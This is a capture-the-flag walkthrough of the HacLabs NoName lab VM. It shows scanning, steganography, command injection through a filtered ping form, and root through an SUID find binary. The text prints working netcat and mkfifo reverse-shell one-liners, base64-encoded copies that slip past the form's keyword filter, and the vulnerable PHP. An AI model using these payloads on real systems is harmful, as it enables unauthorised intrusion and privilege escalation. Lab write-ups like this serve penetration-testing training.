---
layout: default
title : muzec - Haclabs NoName Writeup
---


### Enumeration With Nmap

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
┌──(muzec㉿Muzec-Security)-[~/Documents/PG/NoName]
└─$ cat nmap.nmap
# Nmap 7.91 scan initiated Sun Jun 20 11:56:14 2021 as: nmap -sC -sV -oA nmap 192.168.197.15
Nmap scan report for 192.168.197.15
Host is up (0.33s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 20 11:57:26 2021 -- 1 IP address (1 host up) scanned in 71.42 seconds
```

### Web Enumeration On Port 80

Since we have only Port 80 open we know our focus is only on HTTP enumeration now let try to access the IP on our browser to see what we have running between it running apache webserver.

![image](https://user-images.githubusercontent.com/69868171/127360225-7d1315e3-232f-44c7-a6b0-97a1cddf3a50.png)

Just a fake ping form so let try to brute force some directories with `Gobuster` .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/PG/NoName]
└─$ gobuster dir -u http://192.168.127.15/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html,bak,sh,pl,cgi,zip
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.127.15/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html,bak,sh,pl,cgi,zip
[+] Timeout:                 10s
===============================================================
2021/07/28 14:27:53 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 201]
/admin                (Status: 200) [Size: 417]
```

So we Navigate to that directory `http://IP/admin` a page with HacLabs directory of gallery.

![image](https://user-images.githubusercontent.com/69868171/127361236-22530148-fb90-4e5b-8905-1d488ee00838.png)

Let try checking the source code.

![image](https://user-images.githubusercontent.com/69868171/127361319-dabae405-0db8-4751-9b93-970701d78187.png)

Going through the source code we find the following comment at the last line: `<!--passphrase:harder-->` now what to do since we have some images let try using `staghide` on them all with the password.

### Steganography

Using `steghide` with the image `haclabs.jpeg` and the passphrase we discover a new directory `superadmin.php`

```
┌──(muzec㉿Muzec-Security)-[~/Documents/PG/NoName]
└─$ steghide info haclabs.jpeg
"haclabs.jpeg":
  format: jpeg
  capacity: 577.0 Byte
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "imp.txt":
    size: 21.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

Extracting

```
┌──(muzec㉿Muzec-Security)-[~/Documents/PG/NoName]
└─$ steghide extract -sf haclabs.jpeg                                                                                                                              1 ⨯
Enter passphrase: 
the file "imp.txt" does already exist. overwrite ? (y/n) y
wrote extracted data to "imp.txt".
```

![image](https://user-images.githubusercontent.com/69868171/127362758-8d675e11-c166-437b-ae4a-bd2c074912cd.png)


### Exploitation Command Injection On Ping Form

I was able to execute some command using `127.0.0.1 | id` but when i try getting a reverse shell i got nothing so i try reading the `superadmin.php` code.

```
127.0.0.1 | cat superadmin.php
```

![image](https://user-images.githubusercontent.com/69868171/127363188-5c896656-b342-484c-8259-2dbd2551408e.png)

Source code Below;

```
<?php
   if (isset($_POST['submitt']))
{
   	$word=array(";","&&","/","bin","&"," &&","ls","nc","dir","pwd");
   	$pinged=$_POST['pinger'];
   	$newStr = str_replace($word, "", $pinged);
   	if(strcmp($pinged, $newStr) == 0)
		{
		    $flag=1;
		}
       else
		{
		   $flag=0;
		}
}

if ($flag==1){
$outer=shell_exec("ping -c 3 $pinged");
echo "<pre>$outer</pre>";
}
```

We can some of the commands are blocked it keep getting fliter but seems we can bypass it.

### Reverse Shell


```
nc.traditional -e /bin/bash IP Port
```

OR

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP Port >/tmp/f
```


I will be trying the two payloads.


![image](https://user-images.githubusercontent.com/69868171/127364061-a605aa8e-9318-47c1-a98e-5cd97c858ed2.png)

So we encode it to base64 also let start our `ncat` listener.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/PG/NoName]
└─$ sudo nc -nvlp 443
[sudo] password for muzec: 
listening on [any] 443 ...
```

```
127.0.0.1 | echo bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDkuMjA5IDQ0Mw== | base64 -d | bash
```

```
┌──(muzec㉿Muzec-Security)-[~/Documents/PG/NoName]
└─$ sudo nc -nvlp 443
[sudo] password for muzec: 
listening on [any] 443 ...
connect to [192.168.49.209] from (UNKNOWN) [192.168.209.15] 57488
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have shell cool right now let try the second payload.

```
127.0.0.1 |  echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC40OS4yMDkgODAgPi90bXAvZg== | base64 -d | bash
```

![image](https://user-images.githubusercontent.com/69868171/127364733-820b109b-0341-49bb-b18e-751ea5b7b94c.png)

We have also shell with it now let spawn a TTY shell and root the box.

```
python3 -c 'import pty; pty.spawn ("/bin/bash")'
```

### Privilege Escalation


![image](https://user-images.githubusercontent.com/69868171/127364994-a9408a4e-c3a1-49fe-a6d9-3201b111b4bf.png)

```
sudo -l
```
We go nothing so let try checking for SUID permission with `find / -perm -u=s -type f 2>/dev/null` .

```
www-data@haclabs:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/snapd/snap-confine   
/usr/lib/openssh/ssh-keysign  
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper               
/usr/lib/policykit-1/polkit-agent-helper-1 
/usr/sbin/pppd                                                                     
/usr/bin/pkexec              
/usr/bin/find              
/usr/bin/gpasswd          
/usr/bin/chfn           
/usr/bin/chsh               
/usr/bin/arping               
/usr/bin/passwd               
/usr/bin/traceroute6.iputils     
/usr/bin/sudo                   
/usr/bin/newgrp                 
/snap/core/8689/bin/mount     
/snap/core/8689/bin/ping                                                           
/snap/core/8689/bin/ping6    
```

We have find on SUID cool that our way to root.


```
/usr/bin/find . -exec /bin/sh -p \; -quit
```

![image](https://user-images.githubusercontent.com/69868171/127365867-d031720c-5149-4acc-adec-eead3ce588c6.png)


We are root and done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
